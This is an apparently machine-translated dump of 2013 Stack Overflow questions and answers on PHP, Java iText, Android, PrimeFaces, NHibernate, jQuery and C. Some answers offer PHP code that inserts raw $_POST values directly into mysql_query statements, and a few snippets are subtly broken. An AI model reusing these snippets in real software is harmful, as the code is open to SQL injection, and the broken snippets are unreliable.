                    $src = wp_get_attachment_image_src($media_item['value'], 'full');
                    echo "<a $class href=\"$src[0]\">" . wp_get_attachment_image($media_item['value']) . "</a>";
                    break;
                case 'youtube':
                    echo "<p>";
                    echo "<object width=\"480\" height=\"385\">";
                    echo "  <param name=\"movie\" value=\"http://www.youtube.com/" . $media_item['value'] . "&amp;hl=en_US&amp;fs=1\"/>";
                    echo "  <param name=\"allowFullScreen\" value=\"true\"/>";
                    echo "  <param name=\"allowscriptaccess\" value=\"always\"/>";
                    echo "  <embed src=\"http://www.youtube.com/v/" . $media_item['value'] . "&amp;hl=en_US&amp;fs=1\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"480\" height=\"385\"/>";
                    echo "</object>";
                    echo "</p>";
                    break;
                case 'snippet':
                    echo $media_item['value'];
                    break;
            endswitch;
        ?>
    </div><!-- END box -->
<?php endforeach; ?>
</div><!-- END container --> 
```

但是，它不会将类添加到锚点。任何帮助将非常感激。

先感谢您！

皮特

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T10:43:11.733

由于您没有在其他任何地方使用具有相同类的标签，仅在“图像”的情况下，为什么需要 $class 变量的条件？更重要的是，为什么需要对变量声明 'class="project-img"'？我会用这种方式：

```
 $class = 'project-img';
 ...
 echo "<a class='$class' href=\"$src[0]\">" ... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T10:44:51.750

您在三元测试中的比较运算符是错误的：使用`==`而不是`=`.

```
$class = ($class == ('')) ? 'class="project-img"' : ''; 
```

顺便说一句，我不确定你的意思`('')`！

# java - iText unicode字体问题

> ID：16013121
> 
> 赞同：1
> 
> 时间：2013-04-15T10:38:53.080
> 
> 标签：java, fonts, alignment, reporting, itext

我一直在使用 itext (lowagie) sdk 在 java 中使用 ttf 字体。我想通过例子来解释我的问题。

我有一个表格行，我想在其中显示一些文本（孟加拉语 ttf）。文本应该占用 2 行，但它占用 3 行。问题是，第一行只显示了 5 个单词，并且在结尾处显示了巨大的空白，看起来好像可以轻松占用 8 个单词。

请注意，如果我使用英语，我不会遇到这样的问题。我认为孟加拉语 unicode 导致了问题。如果有任何关于这个问题的锻炼，那就太好了。

我通过示例重新解释了我的问题：

```
Output:

Line1: AAA BBBB CCCC DDDD EEEE <BLANK SPACE BLANK SPACE>ENDOFLINE

Line2: CC DD EE PP QQ RR SS EE <BLANK SPACE BLANK SPACE>ENDOFLINE

Line3: CC DD EE PP QQ RR       <BLANK SPACE BLANK SPACE>ENDOFLINE

Expected:

Line1: AAA BBBB CCCC DDDD EEEE CC DD EE PP  #ENDOFLINE

Line2: QQ RR SS EE CC DD EE PP QQ RR    #ENDOFLINE 
```

源模块：

```
fontpath="D://Bangla.ttf";
this.banglaFont = BaseFont.createFont(fontpath,BaseFont.IDENTITY_H,BaseFont.EMBEDDED);

        PdfPTable bTable = new PdfPTable(1);
        bTable.getDefaultCell().setBorder(1);
        bTable.setWidthPercentage(100);
        bTable.addCell(backTableRow1cell(28.5f, 8.8f, CardStr.GOVTNOTE_BNG));

public static PdfPCell backTableRow1cell(float hght, float fontSize, String txt) {
    PdfPCell c1 = new PdfPCell();
    c1.setFixedHeight(hght);
    c1.setHorizontalAlignment(Element.ALIGN_RIGHT);
    ITextUtil.setCellBorder(c1, 0, 0, 1, 0);
    ITextUtil.setCellPadding(c1, 0, 7, 0, 0);
    c1.addElement(TextProcessing.designPar(TextProcessing.getFontStyle(VoterCard.banglaFont, fontSize, Color.BLACK, Font.NORMAL), txt, Element.ALIGN_LEFT, 8, 2));
    return c1;
}
public static Paragraph designPar(Font fnt, String txt, int alignment, int leading, int afterspacing) {
    Paragraph phrs = new Paragraph(txt, fnt);
    phrs.setLeading(leading);
    phrs.setAlignment(alignment);
    return phrs;
}

public static Font getFontStyle(BaseFont baseFont, float size, Color clr, int FontStyle) {
    Font fnt = new Font(baseFont, size);
    fnt.setColor(clr);
    fnt.setStyle(FontStyle);

    return fnt;
} 
```

![在此处输入图像描述](https://i.stack.imgur.com/Iexxm.jpg)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T07:00:00.093

正如布鲁诺所说，印度语言还不支持连字。因此，如果缩进真的成为必需品，那么它可以通过以下方式实现，因为我仅为此使用旧版本的 itext。

```
Say the text is: "আমার পথ চলা আমার পথে যেনো বেলা শেষে হারায় পথে আমার স্বপ্ন আমার সাথে থাকে স্বপ্নের ভিরে থাকে স্বপ্ন হয়ে রোদ্দুর খুঁজে পাই জীবনের"

And i want to show it in two line as:
আমার পথ চলা আমার পথে যেনো বেলা শেষে হারায় পথে আমার স্বপ্ন
আমার সাথে থাকে স্বপ্নের ভিরে থাকে স্বপ্ন হয়ে রোদ্দুর খুঁজে পাই জীবনের"

then I break it into 4 parts.
txt1="আমার পথ চলা আমার পথে যেনো বেলা শেষে হারায় পথে"
txt2="                                           আমার স্বপ্ন"
txt3="আমার সাথে থাকে স্বপ্নের ভিরে থাকে স্বপ্ন হয়ে রোদ্দুর খুঁজে"
txt4="                                          পাই জীবনের"

    PdfPCell c1 = new PdfPCell();
    c1.setFixedHeight(hght);
    c1.setHorizontalAlignment(Element.ALIGN_RIGHT);
    ITextUtil.setCellBorder(c1, 0, 0, 1, 0);
    ITextUtil.setCellPadding(c1, 0, 7, 0, 0);

    Paragraph phrs1 = new Paragraph(txt1, fnt);
    phrs1.setLeading(12);
    c1.addElement(phrs1);

    Paragraph phrs2 = new Paragraph(txt2, fnt);
    phrs2.setLeading(0);
    c1.addElement(phrs2);

    Paragraph phrs3 = new Paragraph(txt3, fnt);
    phrs3.setLeading(11);
    c1.addElement(phrs3);

    Paragraph phrs4 = new Paragraph(txt4, fnt);
    phrs4.setLeading(0);
    c1.addElement(phrs4); 
```

// 请注意，您可能需要更改前导值以进行调整，并且它适用于孟加拉语等印度语，而不适用于英语

# android - 在应用程序屏幕上保持广告/横幅静态

> ID：16013126
> 
> 赞同：0
> 
> 时间：2013-04-15T10:39:09.100
> 
> 标签：android, iphone, admob, iad, ads

在向 Google Play/App Store 发布了一些应用程序后，我注意到保持广告静态的应用程序的收入更高（它也增加了 eCPM）。

静态是指当您在活动之间导航时，广告始终可见，我在 Phonegap 应用程序中实现了这一点，因为它们实际上是一个托管 web 视图的屏幕。

我的问题是在 IOS 和 Android 上的本机应用程序中实现这一目标的推荐技术是什么。

我正在寻找一个概念性的解决方案，因此在两个平台上都提出了问题。

谢谢！

乌迪

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T10:49:28.810

一种方法是创建 BaseActivity 并将 AdsView 对象声明为通用的，因此通过扩展此活动，您可以获得单个实例。

另一个是没有创建任何 BaseActivity 将您的 AdsView 声明为公共静态并在所有屏幕中使用并在 Adsview 容器中添加此视图意味着稍后在屏幕/活动以指定布局开始时使用任何空布局添加此视图

# php - 将 ArrayList 数据从 Android 发送到 php 服务器

> ID：16013127
> 
> 赞同：0
> 
> 时间：2013-04-15T10:39:12.183
> 
> 标签：php, android

目前我正在尝试将 ArrayList 数据发送到 php 服务器，但无法成功。ArrayList 包含以下数据：食物名称、食物价格、数量、备注，它们都存储在对象订单中。是这样的

```
 Order order = new Order();

    order.setFood_name(fooddetail.getString(TAG_FOODNAME));
    order.setFood_price(fooddetail.getString(TAG_FOODPRICE));
    order.setNumber(Integer.toString(number));
    order.setRemark(remark.getText().toString().trim());

    Global.orderList.add(order); 
```

现在我想将它们传递给 php 服务器，这是我尝试过的代码

```
 try{
                        httpclient=new DefaultHttpClient();
                        httppost= new HttpPost("http://10.0.2.2/android_user/print.php");
                        nameValuePairs = new ArrayList<NameValuePair>();
                        nameValuePairs.add(new BasicNameValuePair("count", Integer.toString(count)));
                        for(int i=0;i<Global.orderList.size();i++)
                           {
                            nameValuePairs.add(new BasicNameValuePair("username", Global.UserID));
                            nameValuePairs.add(new BasicNameValuePair("food_name", Global.orderList.get(i).getFood_name()));
                            nameValuePairs.add(new BasicNameValuePair("food_price", Global.orderList.get(i).getFood_price()));
                            nameValuePairs.add(new BasicNameValuePair("quantity", Global.orderList.get(i).getQuantity()));
                            nameValuePairs.add(new BasicNameValuePair("remark", Global.orderList.get(i).getRemark()));
                           }

                        httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
                        ResponseHandler<String> responseHandler = new BasicResponseHandler();
                        final String res = httpclient.execute(httppost, responseHandler);

                        if(res.equalsIgnoreCase("Order successfully sent"))
                        {
                            runOnUiThread(new Runnable() 
                            {
                                public void run() 
                                {
                                    Toast.makeText(OrderListActivity.this,"Order Success", Toast.LENGTH_SHORT).show();
                                }
                            });

                            startActivity(new Intent(OrderListActivity.this, LoginActivity.class));
                        }
                        else if(res.equalsIgnoreCase("Oops! Order failed to submit"))
                        {
                            alertmessage = "Oops! Order failed to submit!";
                            showAlert();
                        }
                        else
                        {
                            alertmessage = res.toString();
                            showAlert();
                        }
                    }
                    catch(Exception e)
                    {
                        e.printStackTrace();
                    } 
```

这是php端代码

```
 for($i=0; $i<count($_POST['food_name']);$i++)
    {
    $food_name = $_POST['food_name'][$i];
    $food_price = $_POST['food_price'][$i];
    $quantity = $_POST['quantity'][$i];
    $remark = $_POST['remark'][$i];
    $username = $_POST['username'][$i];

    $result = mysql_query("INSERT INTO orderlist(food_name, food_price, quantity, remark, username) VALUES('$food_name', '$food_price', '$quantity','$remark','$username')");
    } 
```

我的问题是，如何发送多行数据并将它们存储到数据库中？目前我只能存储一行或最后一行数据..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T12:51:00.893

这个问题：在 UrlEncodedFormEntity(nameValuePairs) 你的对象状态相同的名称之后，它被设置为最后一个数据：

```
nameValuePairs.add(new BasicNameValuePair("username", Global.UserID));
nameValuePairs.add(new BasicNameValuePair("food_name", Global.orderList.get(i).getFood_name()));
nameValuePairs.add(new BasicNameValuePair("food_price", Global.orderList.get(i).getFood_price()));
nameValuePairs.add(new BasicNameValuePair("quantity", Global.orderList.get(i).getQuantity()));
nameValuePairs.add(new BasicNameValuePair("remark", Global.orderList.get(i).getRemark())); 
```

解决此问题，您需要为对名称添加前缀（例如：“用户名”+ loopIndexNumber）或发送数据分别为每个发送数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T10:42:43.350

尝试这个：

```
$food_name = $_POST['food_name'];
$food_price = $_POST['food_price'];
$quantity = $_POST['quantity'];
$remark = $_POST['remark'];
$username = $_POST['username'];

for($i=0; $i<count($_POST['food_name']);$i++)
{
    $result = mysql_query("INSERT INTO orderlist(food_name, food_price, quantity, remark, username) VALUES('$food_name[$i]', '$food_price[$i]', '$quantity[$i]','$remark[$i]','$username[$i]')");
} 
```

# c# - ServiceStack 从我的服务调用身份验证

> ID：16013131
> 
> 赞同：1
> 
> 时间：2013-04-15T10:39:25.847
> 
> 标签：c#, servicestack

我想帮助用户从我的服务登录，因此我不是直接发布到链接“/auth/basics”或“/auth/credentials”，而是从我的代码中执行此操作：

```
public class LoginService : Service {
    public LoginResponse Post(Login req) {
        var authService = ServiceStack.WebHost.Endpoints.AppHostBase.Instance.Container.Resolve<AuthService>();
        authService.RequestContext = new HttpRequestContext(
            System.Web.HttpContext.Current.Request.ToRequest(),
            System.Web.HttpContext.Current.Response.ToResponse(), 
            null
        );
        authResponse = AuthService.Authenticate(
                           new Auth{ 
                               UserName = req.UserName, 
                               Password = req.Password,
                               RememberMe = true 
        });
        if(authResponse.UserName != null) {
            //sccessful
            //and does it automatically write session to cookies too? 
            //or do I need to write to session manually?
        }

    }
} 
```

这是我到目前为止所知道的。这是正确的方法吗？我想和你确认一下。

# primefaces - 如何更改 TabMenu 中的 activeindex

> ID：16013132
> 
> 赞同：0
> 
> 时间：2013-04-15T10:39:26.867
> 
> 标签：primefaces

我有一个关于 primefacess 的组件 Tabmenu 的问题，特别是属性活动索引，即所选页面的索引。我想根据选择的页面更改它，但它总是固定在首页上！这是我的代码：

```
<ui:composition xmlns="http://www.w3.org/1999/xhtml"
    xmlns:ui="http://java.sun.com/jsf/facelets"
    xmlns:h="http://java.sun.com/jsf/html"
    xmlns:p="http://primefaces.org/ui">

    <p:tabMenu rendered="true"   widgetVar="index">  
        <p:menuitem value="Home" url="Menu.jsf" icon="ui-icon-star"/>  
        <p:menuitem value="Fabricants" url="/pagess/pagesFabricant/Fabricant.jsf" icon="ui-icon-wrench" oncomplete="index.select(1)"/>  
        <p:menuitem value="Composants" url="/pagess/pagesComposant/Composant.jsf" icon="ui-icon-search" oncomplete="index.select(2)"/>  
        <p:menuitem value="Dossier d'equivalence" url="DEQ.jsf" icon="ui-icon-document" oncomplete="index.select(3)"/>  
    </p:tabMenu> 
    </ui:composition> 
```

它不起作用

* * *

感谢您的合作，但它不起作用

```
xmlns="http://www.w3.org/1999/xhtml"
    xmlns:ui="http://java.sun.com/jsf/facelets"
    xmlns:h="http://java.sun.com/jsf/html"
    xmlns:p="http://primefaces.org/ui">

<p:tabMenu activeIndex="0" > 
    <p:menuitem value="Home" url="Menu.jsf" icon="ui-icon-star"  update="@all"/>  
    <p:menuitem value="Fabricants" url="/pagess/pagesFabricant/Fabricant.jsf" icon="ui-icon-wrench" update="@all" />  
    <p:menuitem value="Composants" url="/pagess/pagesComposant/Composant.jsf" icon="ui-icon-search" update="@all"/>  
    <p:menuitem value="Dossier d'equivalence" url="DEQ.jsf" icon="ui-icon-document"  update="@all"/>  
</p:tabMenu> 

</ui:composition> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-07T06:40:26.267

tabmenu 上的*activeIndex*属性将该索引上的选项卡设置为活动状态。如果您单击 primefaces 选项卡展示中的选项卡并继续查看源示例，您会发现这正是正在发生的事情。他们在每个页面上设置不同的 activeIndex。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-07-16T11:49:50.277

我在 PrimeFaces 展示中找到了解决方案。您可以将请求参数添加到菜单项并将此参数附加到您的 url。所以不需要支持 bean 来保持活动索引：

```
<p:tabMenu activeIndex="#{param.i}">
   <p:menuitem value="Home" icon="ui-icon-home" url="page1.xhtml?i=0">
      <f:param name="i" value="0" />
   </p:menuitem>
   <p:menuitem value="Search" icon="ui-icon-search" url="page2.xhtml?i=1">
      <f:param name="i" value="1" />
   </p:menuitem>
   ...
</p:tabMenu> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-03-08T07:58:49.407

**创建模板.xhtml**

```
<?xml version="1.0" encoding="UTF-8"?>
<ui:composition 
    xmlns="http://www.w3.org/1999/xhtml"
    xmlns:ui="http://java.sun.com/jsf/facelets"
    xmlns:f="http://java.sun.com/jsf/core"
    xmlns:h="http://java.sun.com/jsf/html"
    xmlns:p="http://primefaces.org/ui">

    <p:tabMenu activeIndex="#{activeIndex}">
        <p:menuitem 
            value="tab1"
            url="/tab1.jsf">
        </p:menuitem>
        <p:menuitem 
            value="tab2" 
            url="/tab2.jsf">
        </p:menuitem>   
    </p:tabMenu>

    <h:panelGroup id="mainPanel" style="width:100%">
        <ui:insert name="page">Page Content</ui:insert>
    </h:panelGroup>

</ui:composition> 
```

**在标签页中设置参数**

```
<ui:composition xmlns="http://www.w3.org/1999/xhtml"
    xmlns:ui="http://java.sun.com/jsf/facelets"
    xmlns:f="http://java.sun.com/jsf/core"
    xmlns:h="http://java.sun.com/jsf/html"
    xmlns:p="http://primefaces.org/ui" 
    template="template.xhtml">

    <ui:param name="activeIndex" value="1" />

    <ui:define name="page">
        tab1 content
    </ui:define>
</ui:composition> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-05-07T07:09:35.300

假设您有两个 .jsf 文件，即**Menu.jsf**和**Fabricant.jsf**

将以下代码段放入**Menu.jsf**中，它将从 menuItem 中选择第 0 个索引

```
<p:tabMenu activeIndex="0" > 
    <p:menuitem value="Home" url="Menu.jsf" icon="ui-icon-star"/>  
    <p:menuitem value="Fabricants" url="/pagess/pagesFabricant/Fabricant.jsf" icon="ui-icon-wrench"/>  
</p:tabMenu> 
```

将以下代码段放入**Fabricant.jsf**中，从 menuItem 中选择第一个索引

```
 <p:tabMenu activeIndex="1" > 
        <p:menuitem value="Home" url="Menu.jsf" icon="ui-icon-star"/>  
        <p:menuitem value="Fabricants" url="/pagess/pagesFabricant/Fabricant.jsf" icon="ui-icon-wrench"/>  
    </p:tabMenu> 
```

欲了解更多信息[，请单击此处](http://www.primefaces.org/showcase/ui/tabMenu.jsf)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-05-07T09:34:33.887

```
<p:tabMenu rendered="true"   widgetVar="#{bean.index}">  
        <p:menuitem value="Home" action="#{bean.redirect(1)}"/>  
        <p:menuitem value="Fabricants" action="#{baen.redirect(2)}"/>  
</p:tabMenu> 

on my bean {
int index;
getter and setter;

public String redirect(int a){
if (a==1){
  index=1;
return "Home" or // "/home.jsf
 }
else if (a==2){
 index =2;
return "Fabricant";
}
} 
```

一切都很好，谢谢您的合作:)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-03-14T14:28:15.327

`<ui:include>`在将选项卡菜单用作其他页面编辑的组件时，我遇到了同样的问题。我将上述建议用于以下修复：

组件（我们称之为 myMenu.xhtml）：

```
<p:tabMenu id="myMenuBar" activeIndex="#{parentIndex}">
    <p:menuitem value="Page One" action="#{PageOneBacker.mainNavigation}" />
    <p:menuitem value="Page Two" action="#{PageTwoBacker.mainNavigation}" />
    <p:menuitem value="Page Three" action="#{PageThreeBacker.mainNavigation}" />
</p:tabMenu> 
```

现在在每一页中，我都有：

```
<ui:include src="../myMenu.xhtml">
    <ui:param name="parentIndex" value="XXX" />
</ui:include> 
```

其中 XXX 是菜单中该页面的数字索引，从 0 开始。我不是 100% 乐意像这样“硬编码”这些索引，但这是一个解决方案。

# nhibernate - 如何通过 NHibernate LINQ 有效删除所有没有子实体的父实体？

> ID：16013133
> 
> 赞同：0
> 
> 时间：2013-04-15T10:39:31.243
> 
> 标签：nhibernate

我需要定期清除我的一些数据库表。清除包括删除所有没有孩子的父母。当前实现使用存储过程来完成此任务。我想要的是消除存储过程并通过 NHibernate Linq 查询实现删除操作。例如，我需要一个删除所有没有项目的发票的查询。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T10:59:15.030

除非您想向您的数据库触发大量删除查询，否则使用 Linq 或 QueryOver 的简短答案是不能的，除非您首先编写一个 ID 列表，然后在子查询中使用它。一枪删除在任何情况下都可能很麻烦`ORM`

大多数解决方案使用存储过程或嵌入式命名查询（SQL 或 HQL）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:36:07.283

使用 a `QueryOver`，您可以找出您希望删除的所有类型的**持久对象。**`Invoice`但正如 Rippo 所说，这将触发几个 Delete 查询。您可以稍微修改一下并创建一个发票 ID 数组。然后创建一个 SqlQuery 使用 . 一次删除所有记录`YourSession.CreateSQLQuery`。

```
var invoicesToDelete = YourSession.QueryOver<Invoice>().Where(invoice => invoice.items == null).List();
var invoiceIds = new List<int>();
foreach(var invoice in invoicesToDelete)
{
    invoiceIds.Add(invoice.Id);
}
string queryString = "delete from invoice where id in(";
foreach(var id in invoiceIds)
{
    queryString = queryString + id + ",";
}
queryString = queryString.TrimEnd(',');
queryString = queryString + ")";
ISQLQuery query = YourSession.CreateSQLQuery(queryString);
queryString.UniqueResult();
YourSession.Transaction.Commit(); 
```

代码看起来很乱，但应该更有效率。

# jquery - IE 7 兼容模式下的 JQuery 不显眼验证导致带有表单的页面出现“未找到成员”错误

> ID：16013134
> 
> 赞同：3
> 
> 时间：2013-04-15T10:39:31.613
> 
> 标签：jquery, ie-compatibility-mode

最近，我在 Internet Explorer 中查看我的网站时发现了一个 JQuery 错误。该错误是源自 JQuery 源的“未找到成员”错误。我注意到单击了兼容模式按钮 - 取消单击这修复了错误，但我不能假设我网站的用户会如此乐于助人。从那以后，我使用不同的兼容模式测试了我的网站，似乎无法摆脱这个错误。

为了重新创建错误，我将测试页修剪为以下内容

```
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=IE7">
        <script src="/content/scripts/jquery-1.9.1.js"></script>
        <script src="/content/scripts/jquery.validate.js"></script>
        <script src="/content/scripts/jquery.validate.unobtrusive.js"></script>
        <title>IE Compatibility Test</title>
    </head>
    <body>
        <form>
        </form>
    </body>
</html> 
```

注意：我使用的是 JQuery Validation 1.11.1 版和 Microsoft JQuery Unobtrusive Validation 2.0 版。页面加载时出现“未找到成员”错误。我注意到删除表单标签会阻止错误的发生。我也尝试为表单提供名称和 ID，但错误仍然存​​在。

我已经搜索了其他遇到此错误的人，但没有发现任何相关内容。这让我相信我做错了什么。我想解决这个问题，因为我担心我的网站的用户会在 IE 中选择“兼容性视图”并且该网站将无法正常运行。

我错过了什么/有没有其他人遇到过这个错误？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-16T00:20:21.823

Are you using IE 10? If yes then changing to compatibility mode to IE 7 or 8 is a bug.

Please refer to [JQuery Unobtrusive Validation Bug ticket # 12577](http://bugs.jquery.com/ticket/12577)

Use the following meta to ensure the latest rendering engine is used

```
<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
```

# php - Mysql 数据库警告：mysql_fetch_array() 期望参数 1 是资源，布尔值

> ID：16013136
> 
> 赞同：-2
> 
> 时间：2013-04-15T10:39:43.867
> 
> 标签：php, database

当我运行我的网页时，无论我使用哪个代码，我总是会收到此错误

```
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /home/content/33/10729533/html/website/panel.php on line 67 
```

这是我的代码

```
<?php
$connect = mysql_connect("N/A","N/A","N/A");
mysql_select_db("cdkeys");
$query = mysql_query("SELECT * FROM cdkeys WHERE = 'cdkeys'");
WHILE($rows = mysql_fetch_array($query)):

    $cdkeys = $rows['cdkeys'];

    echo "$cdkeys";

    endwhile;
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T10:40:55.633

**`SELECT`你的语法有错误**

```
$query = mysql_query("SELECT * FROM cdkeys WHERE = 'cdkeys'"); 
```

如您所见，您在 sintax 中错过了包含等于的字段`cdkeys`。
**请更改为**

```
$query = mysql_query("SELECT * FROM `cdkeys` WHERE `FIELD` = 'cdkeys'"); 
```

**注意：**`FIELD`随表格的实际字段而变化

**参考** [这里](http://dev.mysql.com/doc/refman/5.0/en/select.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T10:41:31.653

您的查询错误，where 子句中缺少列名

改变

```
$query = mysql_query("SELECT * FROM cdkeys WHERE = 'cdkeys'"); 
```

至

```
$query = mysql_query("SELECT * FROM cdkeys WHERE columname = 'cdkeys'"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T10:42:12.840

改变

```
$query = mysql_query("SELECT * FROM cdkeys WHERE = 'cdkeys'"); 
```

至

```
 $query = mysql_query("SELECT * FROM cdkeys WHERE  columnname = 'cdkeys'"); 
```

# javascript - JavaScript 类型错误 data[i] 未定义 - 但值存在并显示

> ID：16013142
> 
> 赞同：0
> 
> 时间：2013-04-15T10:40:03.163
> 
> 标签：javascript, typeerror

嗨我有一个很奇怪的情况：

JavaScript 调试器给我写了一个错误：

```
TypeError: friends.persons[1] is undefined 
```

但是当我这样做时：

```
alert(friends.persons[1].name.firstname); 
```

例如，它会显示我的名字“Ivan”。

friends 是一个 JSON 数据，来自 Ajax 请求。

怎么办，删除这个错误信息？

谢谢尼克

# php - 保存时 Kohana ORM 更新列

> ID：16013143
> 
> 赞同：0
> 
> 时间：2013-04-15T10:40:05.023
> 
> 标签：php, kohana-3, kohana-orm

我对 ORM 相当陌生，但我想做的是在 MySQL 数据库中插入新评论并更新用户表。

所以我有两张桌子，`users`和`comments`。

现在，当我`save()`在评论对象上调用方法时，我想将该评论插入到`comments`表中并更新用户`written_comments`列`users`。

我只需要插入评论的部​​分很简单，我已经完成了。

问题来自更新查询，我需要更新`users`表并设置`written_comments + 1 where id = $userId`

我找到了有关对象之间关系的文档，但我无法弄清楚。

我正在使用 Kohana 3.3 版本。

我的`comments`课现在是空的：

```
class Model_Comments extends ORM{

} 
```

我正在扩展 Auth 用户类

```
class Model_User extends Model_Auth_User  {

} 
```

任何帮助都会有很大帮助，谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T18:32:46.917

如果您只想使用 ORM，请在保存评论后尝试编写类似这样的内容

```
$user = ORM::factory('User', $userId);
if($user->loaded()){
   $user->set('written_comments', $user->written_comments + 1)->update();
} 
```

无法在 ORM::save() 上绑定回调。您只能使用 ORM::loaded() 方法检查将评论保存到数据库中。

# javascript - 循环内的Javascript提示

> ID：16013146
> 
> 赞同：0
> 
> 时间：2013-04-15T10:40:08.113
> 
> 标签：javascript, loops, prompt

```
for (var j=0; j<2; j++){
listno=prompt("Enter Item Code","0");
listno = parseInt(listno);

if (listno > 0) {
    PRODUCT_WANT.push(PRODUCT_LIST[listno]);
    WANT_PRICE.push(PRICE_LIST[listno]);
}

else {
alert('Invalid Product Code');
}
if (quantno > 0) {
    quantno=prompt("Enter Quantity","0");
    quantno = parseInt(quantno);
    quantity.push(quantno);
}

else {
alert('Invalid Quantity');
}
} 
```

循环有效，但我不想设置循环计数，我希望能够将其设置为例如 999，然后能够在提示符上按取消并完成循环

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T10:44:23.480

`prompt`如果按下取消，将产生 null。

你可能会做这样的事情：

```
while(listno = prompt("Enter Item Code", "0")) {
   ...
} 
```

* * *

**编辑**. 的结果`prompt`将是输入提示中写入的任何内容，或者`null`是否按下了取消。由于在条件中使用时`null`将评估为`false`，因此您可以在 while 循环中使用它，以便在提示评估为 true 时运行一些代码，即只要输入有效数字就继续提示。

[演示](http://jsfiddle.net/VTRGE/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T10:44:33.370

你想要的是一个while循环:)

作为对 Davids 回答的详细说明：while 循环所做的是执行 while 循环的“主体”，直到满足条件。所以首先，你想要有一些可以评估为真或假的条件。如果条件为真，则执行while循环的“主体”，在“主体”中可以更改条件。举个例子

```
var i = 0;
while(i < 20)
{
    i = i+1;
} 
```

只要 i 小于 20，以上将运行。

# jquery - 单击jquery时应用悬停primefaces按钮的样式

> ID：16013157
> 
> 赞同：0
> 
> 时间：2013-04-15T10:40:52.370
> 
> 标签：jquery, css, google-chrome, primefaces, firebug

我想在 jquery 单击一个 primefaces 按钮时应用它的悬停样式

使用 chrome 的萤火虫，我注意到悬停类是`ui-state-hover`，但是当我搜索这种风格的代码时，我发现只有

```
$("#prix").live('click', function(){
            $(this).css('border-color:inherit;font-weight:inherit;');
        }); 
```

但它不起作用

单击按钮时如何应用悬停样式

谢谢你

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T10:56:27.807

您需要使用 jquery 在单击时添加一个新类。然后您可以将任何您想要的样式添加到新类中。

jQuery：

```
$("#prix").on('click', function(){
  $(this).addClass("selected");
}); 
```

CSS：

```
.selected{color:#fff} 
```

[jquery addclass](http://api.jquery.com/addClass/)和[jquery removeclass](http://api.jquery.com/removeClass/)

# c - if/else if/else 菜单问题 c

> ID：16013163
> 
> 赞同：-4
> 
> 时间：2013-04-15T10:41:13.493
> 
> 标签：c, if-statement, menu

我的菜单有问题。我从用户那里得到一个号码，但是每当我得到一个号码时，无论我做什么，它都会执行选项一。我究竟做错了什么？

```
int main()
{   
int array[SIZE];
int size = readNum();
fillArray(array, size);
char option = 'y';
do
{
    int num = menu();
    if(num == 1)
        fillArray(array, size);
    else if(num == 2)
    {
        int newSize = readNum();
        fillArray(array, newSize);
    }
    else
    {
        sortArray(array);
    }
}while(option == 'y');

return 0;
}//end main

int menu()
{
printf("1)Change the values of the array\n2)Change the size of the array and the values in the array\n3)Find and display the mean and median\nChoice: ");
int menuChoice = scanf("%i", &menuChoice);
return menuChoice;
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-15T10:46:17.830

该`scanf`函数返回它进行的数字或成功转换，而不是实际转换的值。似乎它总是成功地读取您的价值，因此将返回`1`一次成功的转换。

要返回实际的用户选择，请不要从调用中分配给它：

```
int menuChoice:

scanf("%i", &menuChoice);

return menuChoice; 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-04-15T10:46:34.927

```
int menuChoice = scanf("%i", &menuChoice); 
```

`scanf`返回成功转换的次数，因此如果扫描成功，您将用 1 覆盖转换后的值。

# class - 如何在 selenium 和 phpunit 中调用表类

> ID：16013165
> 
> 赞同：0
> 
> 时间：2013-04-15T10:41:15.727
> 
> 标签：class, selenium, phpunit

如何`click()`在 selenium 和 phpunit 中的一类表上使用函数。

```
table id="accType1" class="accType tooltip 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T10:45:07.460

在 xpath 中使用它

```
table[class=whatever] 
```

# android - linphone 3.5.2 for android 中的一侧视频

> ID：16013166
> 
> 赞同：0
> 
> 时间：2013-04-15T10:41:18.193
> 
> 标签：android, video, linphone

我在我的 vvoip 应用程序中集成了 linphone 3.5.2。我正在使用 h.263 或 VP8 编解码器和 PCMA 编解码器检查 Windows 上的 linphone 和我的应用程序之间的视频通话。两端的语音工作正常，但我在视频中遇到问题，在我的应用程序中播放两侧视频，但在远程端（在 linphone 窗口上）仅显示本端视图。我在远程端的视图已损坏（与空白窗口相同）。

请帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-10T04:43:49.997

如果您在 LAN 中进行测试，请尝试禁用 stun 服务器设置。

# android - 如何在没有 Eclipse 的情况下将 jar 添加到 APK 并让 APK 引用它？

> ID：16013169
> 
> 赞同：2
> 
> 时间：2013-04-15T10:41:42.357
> 
> 标签：android, jar, runtime, apk, refer

